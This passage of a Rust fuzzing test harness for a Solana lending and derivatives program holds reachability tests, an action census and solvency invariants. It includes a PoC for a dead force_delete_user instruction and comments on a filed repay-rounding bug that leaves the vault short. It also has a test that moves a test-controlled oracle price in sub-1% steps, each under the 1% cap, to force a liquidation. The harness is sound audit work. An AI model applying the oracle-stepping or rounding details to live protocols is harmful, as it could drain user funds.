                "move market 1 oracle (+0.99%)"
            );
        }
        let after = read_zc::<PythLazerOracle>(&f.ctx, &f.spot_1_oracle_pda)
            .expect("market 1 oracle")
            .price;
        assert!(
            after > before,
            "compounded sub-1% steps should raise the price: {} -> {}",
            before,
            after
        );
        // 40 steps of +0.99% compounds to roughly +48%, while no SINGLE step
        // ever exceeds 1% — which is what keeps every intermediate state one the
        // protocol could really be in.
        assert!(
            after > before * 13 / 10,
            "40 steps should compound well past +30%: {} -> {}",
            before,
            after
        );

        // Best-effort (gated on the victim being below maintenance): must not panic.
        let _ = f.action_liquidate_spot(0, 0, 0, 1, 1_000_000_000, 0, 1_000_000);
        let _ = f.action_liquidate_borrow_for_perp_pnl(0, 0, 1, 1_000_000_000, 0, 1_000_000);
        let _ = f.action_liquidate_spot_with_swap(0, 0, 0, 1, 1_000_000, 1);
        let _ = f.action_swap(0, 0, 1, 1_000_000, 1_000_000, 0, 1_000_000, 0);
        let _ = f.action_transfer_pools(0, 1, 0, 0, 0, 1_000_000, 0, 1_000_000);
        let _ = f.action_update_spot_market_cumulative_interest();
    }

    /// ACTION CENSUS — every action must be able to succeed at least once.
    ///
    /// An action that can never succeed is worse than no action: the fuzzer
    /// still spends its mutation budget picking it, and the failure is invisible
    /// (each action returns bool, and "false" is indistinguishable from a
    /// legitimately-rejected input). Crucible's aggregate `discovered: N/M`
    /// counter says how many fire but never WHICH, so this census drives each
    /// one from a deliberately rich state and prints a table.
    ///
    /// Not every action can succeed here — some need state this scenario does
    /// not build (a bankrupt user, an expired market). Those are listed in
    /// `EXPECTED_CONDITIONAL` with the reason, so the test still fails loudly if
    /// an action that SHOULD work silently stops working.
    /// Do the "works in the census but never fires under fuzzing" actions work
    /// when called COLD, as the fuzzer would hit them — first action, no setup?
    #[test]
    fn cold_start_actions() {
        let mut f = Fixture::setup();
        println!(
            "init_revenue_share       {}",
            f.action_init_revenue_share(0)
        );
        let mut g = Fixture::setup();
        println!(
            "init_signed_msg_ws       {}",
            g.action_init_signed_msg_ws_delegates(0, 1)
        );
        let mut h = Fixture::setup();
        println!(
            "change_ws_delegate       {}",
            h.action_change_signed_msg_ws_delegate(0, 1)
        );
        let mut i = Fixture::setup();
        println!(
            "delete_signed_msg_orders {}",
            i.action_delete_signed_msg_user_orders(0)
        );
        let mut k = Fixture::setup();
        println!(
            "transfer_isolated        {}",
            k.action_transfer_isolated_deposit(0, 0, 1, 500_000)
        );
    }

    /// The signed-message ("swift") envelope is byte-exact or it is nothing:
    /// every offset in the ed25519 pre-instruction is re-derived and re-checked
    /// by the program. This test is what proves the layout, because under
    /// fuzzing a malformed envelope is indistinguishable from a legitimately
    /// rejected order.
    #[test]
    fn signed_msg_taker_order_reachable() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_init_signed_msg_user_orders(0, 8));
        assert!(
            f.action_place_signed_msg_taker_order(0, 0, 10_000_000, 0, 0, 0, 0, 0),
            "signed-msg taker order rejected; run with FUZZ_DEBUG=1 for the program logs"
        );
        assert_eq!(f.signed_uuids.len(), 1, "uuid should have been recorded");

        assert!(f.action_update_amm_cache(), "update_amm_cache rejected");
        assert!(
            f.action_post_pyth_lazer_update(0, 1, 50, 1, 1_000, 1, 0),
            "signed pyth lazer update rejected"
        );
        assert!(
            f.action_post_pyth_lazer_update(1, 0, 20, 0, 0, 0, 0),
            "signed pyth lazer update (spot feed) rejected"
        );
        assert!(f.action_init_signed_msg_user_orders(1, 8));
        assert!(f.action_place_signed_msg_taker_order(1, 1, 10_000_000, 1, 1, 1, 500, 0));

        // ...and a maker crossing it by uuid.
        assert!(
            f.action_place_and_make_signed_msg(1, 0, 10_000_000, 0, 0),
            "place_and_make against a recorded signed-msg uuid rejected"
        );
    }

    /// A real, *successful* spot liquidation — not just "the call did not panic".
    ///
    /// Everything in the liquidation family was previously reaching only its
    /// `SufficientCollateral` guard, because nothing in the harness ever built a
    /// victim who was actually below maintenance margin.
    #[test]
    fn spot_liquidation_actually_executes() {
        let mut f = Fixture::setup();
        // Victim: quote collateral, then a borrow sized to the initial-margin
        // limit. Kept well inside the counterparty's 900-unit market-1 deposit
        // (INITIAL_SOL is 1,000) so the borrow is limited by MARGIN, not by
        // available liquidity — otherwise it fails as
        // `SpotMarketInsufficientDeposits` and never approaches maintenance.
        assert!(f.action_deposit(0, 500 * QUOTE_PRECISION as u64, 0, 0));
        // Counterparty liquidity so the borrow has something to draw on, and so
        // the liquidator holds liability tokens to repay with.
        assert!(f.action_deposit(1, 900 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_deposit(1, 10_000 * QUOTE_PRECISION as u64, 0, 0));

        assert!(
            f.action_borrow_to_margin_limit(0, 100),
            "borrow to the initial-margin limit"
        );
        let user = f.read_user(&f.users[0].user_pda).expect("victim");
        assert!(
            user.spot_positions.iter().any(|sp| sp.market_index == 1
                && sp.balance_type == SpotBalanceType::Borrow
                && sp.scaled_balance > 0),
            "victim should hold a market-1 borrow"
        );

        // Walk the borrowed asset's price up in sub-1% steps until maintenance
        // breaks. From the initial limit (1.2x) to maintenance (1.1x) is ~9%.
        let mut liquidated = false;
        for _ in 0..40 {
            assert!(f.action_move_spot_1_oracle_price(1, 99, 0, 0, 0));
            if f.action_liquidate_spot(0, 0, 0, 1, 1_000_000_000_000, 0, 0) {
                liquidated = true;
                break;
            }
        }
        assert!(
            liquidated,
            "liquidate_spot never succeeded; the victim never went below maintenance"
        );
    }

    /// PoC: `force_delete_user` is unconditionally dead (AccountBorrowFailed).
    ///
    /// Drives the REAL instruction end-to-end through LiteSVM against an account
    /// that satisfies every guard the handler checks, and shows it still fails
    /// with a runtime borrow error rather than reaching any of them.
    #[test]
    fn poc_force_delete_user_account_borrow_failed() {
        let mut f = Fixture::setup();

        // A `fresh` authority: bootstrapped empty, so equity is 0 — comfortably
        // under the handler's QUOTE_PRECISION/20 ($0.05) ceiling.
        assert!(f.action_initialize_user_stats(0), "init user_stats");
        assert!(f.action_initialize_fresh_user(0, 0), "init user");
        // Age it past the ~3-month inactivity gate (18,144,000 slots).
        assert!(f.action_warp_long(4, 1), "warp 4 months");

        let kp = f.fresh[0].clone();
        let (stats_pda, _) =
            Pubkey::find_program_address(&[b"user_stats", kp.pubkey().as_ref()], &f.program_id);
        let (user_pda, _) = Pubkey::find_program_address(
            &[b"user", kp.pubkey().as_ref(), &0u16.to_le_bytes()],
            &f.program_id,
        );

        let crank = f.crank.clone();
        let mut accounts = vec![
            AccountMeta::new(user_pda, false),
            AccountMeta::new(stats_pda, false),
            AccountMeta::new(f.state_pda(), false),
            AccountMeta::new(kp.pubkey(), false),
            AccountMeta::new(crank.pubkey(), true), // hot UserFlag key
            AccountMeta::new_readonly(f.signer_pda, false),
        ];
        accounts.extend(f.market_ras(false));

        let out = f
            .ctx
            .raw_call(Instruction {
                program_id: f.program_id,
                accounts,
                data: ix_data(D_FORCE_DELETE_USER, &[]),
            })
            .signers(&[&crank])
            .send()
            .expect("tx submitted");

        let logs = out.logs().join("\n");
        println!("success = {}", out.is_success());
        println!("error_code = {:?}", out.error_code());
        println!("logs:\n{}", logs);

        assert!(
            !out.is_success(),
            "force_delete_user unexpectedly succeeded — the borrow bug may be fixed"
        );
        // The point of the PoC: it is NOT a logic rejection. No guard was
        // reached; the account-data borrow failed at the bottom of the handler.
        assert!(
            logs.contains("AccountBorrowFailed") || logs.contains("already borrowed"),
            "expected AccountBorrowFailed, got: {logs}"
        );
        // And the user account still exists — nothing was reaped.
        assert!(
            f.read_user(&user_pda).is_some(),
            "user should still exist after the failed delete"
        );
    }

    #[test]
    fn action_census() {
        let mut f = Fixture::setup();
        let mut results: Vec<(&str, bool)> = Vec::new();
        macro_rules! run {
            ($name:expr, $e:expr) => {
                results.push(($name, $e));
            };
        }

        // ---- build a rich state first ----
        run!(
            "deposit(m0)",
            f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0)
        );
        run!(
            "deposit(m0,u1)",
            f.action_deposit(1, 500_000 * QUOTE_PRECISION as u64, 0, 0)
        );
        run!(
            "deposit(m1,u1)",
            f.action_deposit(1, 100 * BASE_PRECISION_U64, 1, 0)
        );
        run!(
            "margin_trading_on",
            f.action_update_user_margin_trading_enabled(0, 1)
        );
        run!(
            "margin_trading_on(u1)",
            f.action_update_user_margin_trading_enabled(1, 1)
        );
        run!(
            "deposit_into_isolated",
            f.action_deposit_into_isolated(0, 0, 1_000 * QUOTE_PRECISION as u64)
        );
        run!(
            "withdraw_from_isolated",
            f.action_withdraw_from_isolated(0, 0, 100 * QUOTE_PRECISION as u64)
        );
        run!(
            "transfer_isolated_deposit",
            f.action_transfer_isolated_deposit(0, 0, 1, 500_000)
        );
        run!(
            "place_perp_order",
            f.action_place_perp_order(0, 0, 10_000_000, 0, 1, 0, 1, 0)
        );
        run!(
            "place_perp_order(u1)",
            f.action_place_perp_order(1, 1, 10_000_000, 0, 1, 0, 2, 0)
        );
        run!("place_orders", f.action_place_orders(0, 2, 0, 10_000_000));
        run!(
            "initialize_sub_account",
            f.action_initialize_sub_account(0, 1)
        );
        run!(
            "initialize_user_stats(fresh)",
            f.action_initialize_user_stats(0)
        );
        run!(
            "initialize_fresh_user",
            f.action_initialize_fresh_user(0, 0)
        );
        run!(
            "initialize_referrer_name",
            f.action_initialize_referrer_name(0, 0)
        );
        run!("initialize_if_stake", f.action_initialize_if_stake(0, 0));
        run!(
            "add_if_stake",
            f.action_add_if_stake(0, 1_000 * QUOTE_PRECISION as u64)
        );

        // ---- order management ----
        run!(
            "modify_order",
            f.action_modify_order(0, 1, 0, 0, 0, 1, 20_000_000, 1, 910_000, 0, 0, 0, 0)
        );
        run!(
            "modify_order_by_user_id",
            f.action_modify_order_by_user_id(0, 1, 1, 910_000, 0, 0)
        );
        run!(
            "cancel_order_by_user_id",
            f.action_cancel_order_by_user_id(0, 1)
        );
        run!(
            "cancel_orders_by_ids",
            f.action_cancel_orders_by_ids(0, 1, 1)
        );
        run!("cancel_order", f.action_cancel_order(0, 0, 1, 0));
        run!("cancel_orders", f.action_cancel_orders(0, 0, 0, 0, 0, 0, 0));

        // ---- fill engine ----
        run!(
            "place_perp_order(maker)",
            f.action_place_perp_order(1, 1, 10_000_000, 0, 1, 0, 7, 0)
        );
        run!(
            "place_and_take",
            f.action_place_and_take_perp_order(0, 0, 10_000_000, 0, 0)
        );
        run!(
            "place_taker_order",
            f.action_place_perp_order(0, 0, 10_000_000, 0, 1, 0, 11, 0)
        );
        run!(
            "place_and_make",
            f.action_place_and_make_perp_order(1, 1, 10_000_000, 0)
        );
        run!("fill_perp_order", f.action_fill_perp_order(0, 0, 1, 0, 1));
        run!(
            "place_trigger_order",
            f.action_place_perp_order(0, 0, 10_000_000, 2, 0, 0, 9, 0)
        );
        run!("trigger_order", f.action_trigger_order(0, 0, 0));
        run!("revert_fill", f.action_revert_fill(0));

        // ---- cranks ----
        run!("warp", f.action_warp(4_000, 1));
        run!("warp2", f.action_warp(5_000, 1));
        run!("warp3", f.action_warp(5_000, 1));
        run!("update_amms", f.action_update_amms(0, 1));
        run!(
            "update_perp_bid_ask_twap",
            f.action_update_perp_bid_ask_twap(0, 1)
        );
        run!("update_funding_rate", f.action_update_funding_rate(0));
        run!("settle_funding_payment", f.action_settle_funding_payment(0));
        run!("settle_pnl", f.action_settle_pnl(0));
        run!(
            "settle_multiple_pnls",
            f.action_settle_multiple_pnls(0, 1, 1)
        );
        run!(
            "update_spot_mkt_interest",
            f.action_update_spot_market_cumulative_interest()
        );
        run!("log_user_balances", f.action_log_user_balances(0, 1));
        run!("update_user_idle", f.action_update_user_idle(0, 1, 1, 0));
        run!("native_mm_oracle", f.action_native_mm_oracle(1_000_000));
        run!("native_spread_adjust", f.action_native_spread_adjust(5));
        run!(
            "move_oracle_price",
            f.action_move_oracle_price(1, 50, 0, 0, 0)
        );
        run!(
            "move_spot_1_oracle",
            f.action_move_spot_1_oracle_price(1, 50, 0, 0, 0)
        );

        // ---- user config ----
        run!(
            "update_custom_margin_ratio",
            f.action_update_user_custom_margin_ratio(0, 2_000)
        );
        run!("update_reduce_only", f.action_update_user_reduce_only(0, 0));
        run!("update_user_name", f.action_update_user_name(0, 97));
        run!("update_user_pool_id", f.action_update_user_pool_id(0, 0));
        run!(
            "update_user_delegate",
            f.action_update_user_delegate(0, 0, 0)
        );
        run!(
            "update_user_delegate(sub)",
            f.action_update_user_delegate(0, 0, 1)
        );
        run!(
            "update_perp_pos_margin_ratio",
            f.action_update_user_perp_position_custom_margin_ratio(0, 0, 2_000)
        );
        run!(
            "allow_delegate_transfer",
            f.action_update_user_allow_delegate_transfer(0, 1)
        );

        // ---- transfers / revenue ----
        run!(
            "transfer_deposit",
            f.action_transfer_deposit(0, 1, 100 * QUOTE_PRECISION as u64, 0)
        );
        run!(
            "transfer_deposit_by_delegate",
            f.action_transfer_deposit_by_delegate(0, 1, 100 * QUOTE_PRECISION as u64, 0)
        );
        run!(
            "transfer_perp_position",
            f.action_transfer_perp_position(0, 1, 0, 1_000_000, 0, 0)
        );
        run!(
            "deposit_into_revenue_pool",
            f.action_deposit_into_revenue_pool(0, 1_000 * QUOTE_PRECISION as u64)
        );
        run!("settle_revenue_to_if", f.action_settle_revenue_to_if(0, 1));
        run!("sweep_perp_market_fees", f.action_sweep_perp_market_fees(0));
        run!(
            "update_quote_asset_if_stake",
            f.action_update_user_quote_asset_if_stake(0)
        );
        run!(
            "init_signed_msg_user_orders",
            f.action_init_signed_msg_user_orders(0, 8)
        );
        run!(
            "resize_signed_msg_user_orders",
            f.action_resize_signed_msg_user_orders(0, 16)
        );
        // Both order-placing signed-msg ixs need the taker's SignedMsgUserOrders
        // ring to exist, so they sit between the init/resize above and the
        // `delete_signed_msg_user_orders` further down — after the delete they
        // could only reach the account-missing branch. The taker's ring is
        // user 0's, so user 1 has to be the maker.
        run!(
            "init_signed_msg_user_orders(u1)",
            f.action_init_signed_msg_user_orders(1, 8)
        );
        run!(
            "place_signed_msg_taker_order",
            f.action_place_signed_msg_taker_order(0, 0, 10_000_000, 0, 0, 0, 0, 0)
        );
        run!(
            "place_and_make_signed_msg",
            f.action_place_and_make_signed_msg(1, 0, 10_000_000, 0, 0)
        );
        run!(
            "post_pyth_lazer_update",
            f.action_post_pyth_lazer_update(0, 1, 50, 1, 1_000, 1, 0)
        );
        run!("update_amm_cache", f.action_update_amm_cache());
        run!(
            "init_signed_msg_ws_delegates",
            f.action_init_signed_msg_ws_delegates(0, 1)
        );
        run!(
            "change_signed_msg_ws_delegate",
            f.action_change_signed_msg_ws_delegate(0, 1)
        );
        run!("init_revenue_share", f.action_init_revenue_share(0));
        run!(
            "init_revenue_share_escrow",
            f.action_init_revenue_share_escrow(0, 8)
        );
        run!(
            "resize_revenue_share_escrow",
            f.action_resize_revenue_share_escrow(0, 16)
        );
        run!(
            "change_approved_builder",
            f.action_change_approved_builder(0, 100, 1)
        );
        run!(
            "update_user_stats_referrer_status",
            f.action_update_user_stats_referrer_status(0)
        );
        run!("set_vamm_hedger", f.action_set_vamm_hedger(0, 1));
        run!(
            "special_transfer_perp_to_vamm",
            f.action_special_transfer_perp_to_vamm(0, 0, 1_000_000, 0)
        );
        run!(
            "delete_signed_msg_user_orders",
            f.action_delete_signed_msg_user_orders(0)
        );
        run!(
            "withdraw_protocol_fees_spot",
            f.action_withdraw_protocol_fees_spot(0, 1_000_000)
        );
        run!(
            "withdraw_protocol_fees_perp",
            f.action_withdraw_protocol_fees_perp(1_000_000)
        );

        // ---- borrow, then spot liquidation family ----
        run!(
            "withdraw(m0)",
            f.action_withdraw(0, 1_000 * QUOTE_PRECISION as u64, 0, 0)
        );
        run!(
            "borrow(m1)",
            f.action_withdraw(0, 10 * BASE_PRECISION_U64, 1, 0)
        );
        // transfer_pools migrates BOTH legs, so run it once the user actually
        // holds a market-0 deposit and a market-1 borrow. Sub-accounts are
        // created sequentially and sub 1 already took a transfer_deposit (which
        // freezes its pool_id), so sub 2 is the next clean destination.
        run!(
            "transfer_pools",
            f.action_transfer_pools(0, 2, 0, 0, 1, 1_000_000, 1, 1_000)
        );
        run!(
            "swap",
            f.action_swap(0, 0, 1, 1_000_000, 1_000_000, 0, 1_000_000, 0)
        );
        run!(
            "liquidate_spot",
            f.action_liquidate_spot(0, 0, 0, 1, 1_000_000_000, 0, 1_000_000)
        );
        run!(
            "liquidate_borrow_for_perp_pnl",
            f.action_liquidate_borrow_for_perp_pnl(0, 0, 1, 1_000_000_000, 0, 1_000_000)
        );
        run!(
            "resolve_spot_bankruptcy",
            f.action_resolve_spot_bankruptcy(0, 0, 1)
        );
        run!(
            "resolve_perp_bankruptcy",
            f.action_resolve_perp_bankruptcy(0, 0)
        );
        run!(
            "liquidate_spot_with_swap",
            f.action_liquidate_spot_with_swap(0, 0, 0, 1, 1_000_000, 1)
        );

        // ---- teardown-ish ----
        run!(
            "request_remove_if_stake",
            f.action_request_remove_if_stake(0, 100 * QUOTE_PRECISION as u64)
        );
        run!(
            "cancel_request_remove_if_stake",
            f.action_cancel_request_remove_if_stake(0)
        );
        run!("warp(cooldown)", f.action_warp(4_000, 1));
        run!("remove_if_stake", f.action_remove_if_stake(0, 1));
        run!("force_cancel_orders", f.action_force_cancel_orders(0, 1, 1));
        run!(
            "pause_spot_deposit_withdraw",
            f.action_pause_spot_market_deposit_withdraw()
        );
        run!(
            "trip_equity_floor_breaker",
            f.action_trip_equity_floor_breaker(0, 0)
        );
        run!("reclaim_rent", f.action_reclaim_rent(0));
        run!("delete_user", f.action_delete_user(1, 1, 1));
        run!("force_delete_user", f.action_force_delete_user(1, 1, 0));

        println!("\n==== ACTION CENSUS ====");
        let mut failed = Vec::new();
        for (name, ok) in &results {
            println!("  {:<32} {}", name, if *ok { "ok" } else { "FAIL" });
            if !*ok {
                failed.push(*name);
            }
        }
        println!(
            "  {}/{} succeeded",
            results.len() - failed.len(),
            results.len()
        );

        // Actions that legitimately cannot succeed in THIS scenario.
        const EXPECTED_CONDITIONAL: &[&str] = &[
            // Needs the victim below maintenance margin; the census account is healthy.
            "liquidate_spot",
            "liquidate_borrow_for_perp_pnl",
            "liquidate_spot_with_swap",
            // Need a victim the census pipeline has actually driven into
            // Bankrupt. The census account is healthy, so both resolve paths
            // bail at `UserNotBankrupt`. The fuzzer CAN reach the state:
            // deposit -> borrow_to_margin_limit -> walk market 1's oracle up ->
            // liquidate_spot seizes the collateral and sets the flag.
            "resolve_spot_bankruptcy",
            "resolve_perp_bankruptcy",
            // Needs an undercollateralized account with open orders.
            "force_cancel_orders",
            // Needs the vault/accounting to actually disagree.
            "pause_spot_deposit_withdraw",
            // Needs equity below the configured floor.
            "trip_equity_floor_breaker",
            // Needs a fully wound-down, idle account.
            "delete_user",
            "force_delete_user",
            "reclaim_rent",
            // Needs the unstaking cooldown to have elapsed.
            "remove_if_stake",
            // Needs revenue settled and the APR cap to allow a transfer.
            "settle_revenue_to_if",
            // Needs the source sub-account to already hold BOTH legs (a market-0
            // deposit and a market-1 borrow) and a destination sub-account whose
            // pool_id is still unfrozen. The fuzzer also draws three
            // deliberately-invalid pool-id variants that reject lawfully.
            //
            // (The old note here — "Unreachable with the current 2-market
            // fixture" — was stale: the fixture builds FOUR spot markets, and
            // Anchor's same-vault-twice rejection is exactly what the
            // mint-paired leg selection avoids.)
            "transfer_pools",
            // Needs the account to have gone untouched for the idle window.
            "update_user_idle",
            // Needs a filled position carrying unsettled pnl.
            "settle_multiple_pnls",
            // Needs protocol fees to have ACCRUED from real trading. Seeding
            // `protocol_fee_pool` instead would be an unbacked claim: the
            // program's own validate_spot_market_vault_amount counts that pool,
            // so a seeded balance makes the market insolvent by its own
            // definition and silently fails every later instruction.
            "withdraw_protocol_fees_spot",
            // Needs an isolated position holding transferable collateral.
            "transfer_isolated_deposit",
            // Reaches the handler (past the VammHedger status gate) but needs a
            // perp position shaped for the transfer; the handler body runs, so
            // it still registers coverage.
            "special_transfer_perp_to_vamm",
        ];
        let unexpected: Vec<_> = failed
            .iter()
            .filter(|n| !EXPECTED_CONDITIONAL.contains(n))
            .collect();
        assert!(
            unexpected.is_empty(),
            "actions that should succeed but did not: {:?}",
            unexpected
        );
    }

    #[test]
    fn if_stake_and_revenue_paths_reachable() {
        let mut f = Fixture::setup();
        assert!(
            f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0),
            "deposit"
        );

        // IF-stake lifecycle: init -> add -> request remove -> cancel request.
        assert!(f.action_initialize_if_stake(0, 0), "initialize_if_stake");
        assert!(
            f.action_add_if_stake(0, 1_000 * QUOTE_PRECISION as u64),
            "add_insurance_fund_stake"
        );
        assert!(
            f.action_request_remove_if_stake(0, 100 * QUOTE_PRECISION as u64),
            "request_remove_insurance_fund_stake"
        );
        assert!(
            f.action_cancel_request_remove_if_stake(0),
            "cancel_request_remove_insurance_fund_stake"
        );

        // Revenue plumbing.
        assert!(
            f.action_deposit_into_revenue_pool(0, 1_000 * QUOTE_PRECISION as u64),
            "deposit_into_spot_market_revenue_pool"
        );
        assert!(
            f.action_update_spot_market_cumulative_interest(),
            "update_spot_market_cumulative_interest"
        );

        // A second sub-account, then an intra-authority collateral transfer.
        assert!(
            f.action_initialize_sub_account(0, 1),
            "initialize_user(sub=1)"
        );
        assert!(
            f.action_transfer_deposit(0, 1, 100 * QUOTE_PRECISION as u64, 0),
            "transfer_deposit"
        );

        // Batch-D additions: bootstrap for a fresh authority + keeper pokes.
        assert!(
            f.action_initialize_user_stats(0),
            "initialize_user_stats(fresh)"
        );
        assert!(
            f.action_initialize_fresh_user(0, 0),
            "initialize_user(fresh)"
        );
        assert!(
            f.action_initialize_referrer_name(0, 0),
            "initialize_referrer_name"
        );

        // Best-effort: gated on protocol state this test does not build.
        let _ = f.action_transfer_perp_position(0, 1, 1, 1_000_000, 0, 0);
        let _ = f.action_transfer_deposit_by_delegate(0, 1, 1_000_000, 0);
        let _ = f.action_pause_spot_market_deposit_withdraw();
        let _ = f.action_trip_equity_floor_breaker(0, 0);
        let _ = f.action_force_delete_user(1, 1, 0);
        let _ = f.action_update_user_quote_asset_if_stake(0);
        let _ = f.action_settle_revenue_to_if(0, 1);
        let _ = f.action_sweep_perp_market_fees(0);
        let _ = f.action_remove_if_stake(0, 1);
    }
}

#[cfg(feature = "invariant_solvency")]
#[invariant_test]
fn invariant_solvency(fixture: &mut Fixture) {
    // --- Family I: per-spot-market solvency, for EVERY spot market. ---
    //
    // Spot market 1 (borrowable, oracle-priced, 9 decimals) is where borrows,
    // spot liquidations and swaps land, so leaving it unchecked would mean the
    // harness exercises that state without verifying anything about it. Its
    // solvency check is the same authoritative program helper, and because it is
    // a real borrow market the deposits-cover-borrows property has actual teeth
    // there (on the quote market, with no borrows, it was near-vacuous).
    if let Some(spot_market_1) = fixture.read_spot_market_1() {
        let vault_1 = fixture.ctx.token_balance(&fixture.spot_vault_1_pda);
        if let Err(e) = velocity::math::spot_withdraw::validate_spot_market_vault_amount(
            &spot_market_1,
            vault_1,
        ) {
            // KNOWN BUG SUPPRESSION — issue-01-spot-repay-overcredits-borrow-ledger.
            //
            // A spot repay reduces the recorded debt by one unit more than the
            // tokens it pays (controller/spot_balance.rs:319-320 forces
            // `round_up` on every Borrow-type reduction), so each repay leaves
            // the vault exactly 1 unit short. That bug is FILED; leaving the
            // assertion strict here means every iteration that repays RECORDS a
            // violation, and `#[invariant_test]` then breaks the action loop on
            // `has_violation()` (crucible-invariant-macro/src/lib.rs:1416-1424),
            // which truncates the action sequence and stops the fuzzer from ever
            // exploring what comes after a repay.
            //
            // So tolerate ONLY that signature: at most one unit per action, and
            // crucible caps an iteration at `max_actions` (8), so a shortfall
            // above that bound cannot be this bug and is reported. This keeps
            // the check live for any different or larger solvency failure while
            // letting the fuzzer past the known dust one. Delete this once the
            // repay rounding is fixed.
            const KNOWN_REPAY_ROUNDING_SLACK: i128 = 16; // 2x the per-iteration action cap
                                                         // `validate_spot_balances` returns the same depositors_claim the
                                                         // failing guard compares against.
            let claim = velocity::math::spot_withdraw::validate_spot_balances(&spot_market_1)
                .map(|c| c as i128)
                .unwrap_or(0);
            let shortfall = claim - vault_1 as i128;
            fuzz_assert!(
                shortfall > 0 && shortfall <= KNOWN_REPAY_ROUNDING_SLACK,
                "spot market 1 insolvent by {} units: vault={} claim={} ({:?}) \
                 — exceeds the known repay-rounding signature (<= {} units)",
                shortfall,
                vault_1,
                claim,
                e,
                KNOWN_REPAY_ROUNDING_SLACK
            );
        }

        // Token conservation in market 1's own units: the vault must cover the
        // net amount owed (deposits - borrows) plus the market's pools. A borrow
        // market can legitimately have vault < total deposits (that is what
        // lending is), which is exactly why we reconcile against the NET.
        let mut net_1: i128 = 0;
        for u in &fixture.users {
            if let Some(user) = fixture.read_user(&u.user_pda) {
                for sp in user.spot_positions.iter() {
                    if sp.market_index != 1 || sp.scaled_balance == 0 {
                        continue;
                    }
                    let tok = velocity::math::spot_balance::get_token_amount(
                        sp.scaled_balance as u128,
                        &spot_market_1,
                        &sp.balance_type,
                    )
                    .unwrap_or(0) as i128;
                    match sp.balance_type {
                        SpotBalanceType::Deposit => net_1 += tok,
                        SpotBalanceType::Borrow => net_1 -= tok,
                    }
                }
            }
        }
        let pool_1 = |bal: u128| -> i128 {
            velocity::math::spot_balance::get_token_amount(
                bal,
                &spot_market_1,
                &SpotBalanceType::Deposit,
            )
            .unwrap_or(0) as i128
        };
        let backed_1 = net_1
            + pool_1(spot_market_1.revenue_pool.scaled_balance)
            + pool_1(spot_market_1.protocol_fee_pool.scaled_balance);
        // Same KNOWN BUG suppression as the guard above
        // (issue-01-spot-repay-overcredits-borrow-ledger): each repay leaves the
        // vault 1 unit short, and this independent reconciliation sees the same
        // shortfall. Bound it by the per-iteration action cap so any different
        // or larger conservation failure still reports.
        const KNOWN_REPAY_ROUNDING_SLACK_2: i128 = 16;
        let shortfall_1 = backed_1 - vault_1 as i128;
        fuzz_assert!(
            shortfall_1 <= KNOWN_REPAY_ROUNDING_SLACK_2,
            "spot market 1 conservation: vault={} < backed claims={} by {} units (net_user={}) \
             — exceeds the known repay-rounding signature (<= {} units)",
            vault_1 as i128,
            backed_1,
            shortfall_1,
            net_1,
            KNOWN_REPAY_ROUNDING_SLACK_2
        );

        // BORROW-VS-DEPOSIT — REMOVED HERE, owned by Family XIX below.
        //
        // This was a byte-for-byte duplicate of XIX's predicate on the SAME
        // market ("spot market 1", which XIX covers in its market table) with two
        // differences that made it actively harmful: it was EXACT (no slack) and
        // it ran ~400 lines EARLIER.
        //
        // XIX deliberately tolerates a bounded shortfall — the same
        // issue-01-spot-repay-overcredits-borrow-ledger suppression as the guard
        // above, signature `borrow 30000001 vs deposit 30000000`, one unit per
        // repay, bounded by twice the per-iteration action cap. This copy did
        // not, so every iteration containing a repay recorded a violation here.
        // Under crucible that is not a cosmetic mislabel: `record_violation`
        // keeps only the FIRST message (crucible-test-context/src/lib.rs:
        // 1120-1132) and `#[invariant_test]` then BREAKS the action loop
        // (crucible-invariant-macro/src/lib.rs:1416-1424). So one tolerated dust
        // shortfall both masked every family below this point AND truncated the
        // action sequence.
        //
        // Do not re-add. If this property needs strengthening, strengthen XIX,
        // where the known-bug suppression lives.
    }

    // --- Family I: per-spot-market solvency (the vault covers all claims). ---
    // Uses the program's OWN authoritative check; an Err is a solvency
    // violation (vault holds less than depositor claims).
    if let Some(spot_market) = fixture.read_spot_market() {
        let vault_amount = fixture.ctx.token_balance(&fixture.spot_vault_pda);
        match velocity::math::spot_withdraw::validate_spot_market_vault_amount(
            &spot_market,
            vault_amount,
        ) {
            Ok(_claim) => {}
            Err(e) => {
                fuzz_assert!(
                    false,
                    "spot market 0 insolvent: vault={} fails validate_spot_market_vault_amount ({:?})",
                    vault_amount,
                    e
                );
            }
        }

        // --- Family II: global quote conservation. ---
        // No quote unit is minted: the vault balance must cover the net token
        // amount owed to depositors. We reconcile the vault against the sum of
        // every user's spot-market-0 balance (deposits positive, borrows
        // negative) plus the market's own pool balances, using the program's
        // exact token-amount conversion.
        let mut net_user_tokens: i128 = 0;
        for u in &fixture.users {
            if let Some(user) = fixture.read_user(&u.user_pda) {
                for sp in user.spot_positions.iter() {
                    if sp.market_index != 0 || sp.scaled_balance == 0 {
                        continue;
                    }
                    let tok = velocity::math::spot_balance::get_token_amount(
                        sp.scaled_balance as u128,
                        &spot_market,
                        &sp.balance_type,
                    )
                    .unwrap_or(0) as i128;
                    match sp.balance_type {
                        SpotBalanceType::Deposit => net_user_tokens += tok,
                        SpotBalanceType::Borrow => net_user_tokens -= tok,
                    }
                }
            }
        }
        // KNOWN WEAKNESS (undercount, not a false-positive risk): this user-side
        // sum walks `spot_positions` only. Collateral held inside an ISOLATED
        // perp position lives in `PerpPosition::isolated_position_scaled_balance`
        // and the spot `protocol_fee_pool` is a claim too — neither is counted,
        // so `backed` is a LOWER bound and `vault >= backed` can pass when a
        // stricter accounting would fail. It never fires spuriously.
        //
        // The authoritative check is the program's own
        // `validate_spot_market_vault_amount` above; this reconciliation is a
        // second, independent view. Making it exact means reconciling the market
        // AGGREGATE (deposit_balance - borrow_balance) against the sum over
        // users, which is a genuinely different property worth adding.
        //
        // Pool balances denominated in this (quote) market.
        let pool_tokens = |bal: u128| -> i128 {
            velocity::math::spot_balance::get_token_amount(
                bal,
                &spot_market,
                &SpotBalanceType::Deposit,
            )
            .unwrap_or(0) as i128
        };
        let mut backed: i128 = net_user_tokens;
        backed += pool_tokens(spot_market.revenue_pool.scaled_balance);
        if let Some(perp_market) = fixture.read_perp_market() {
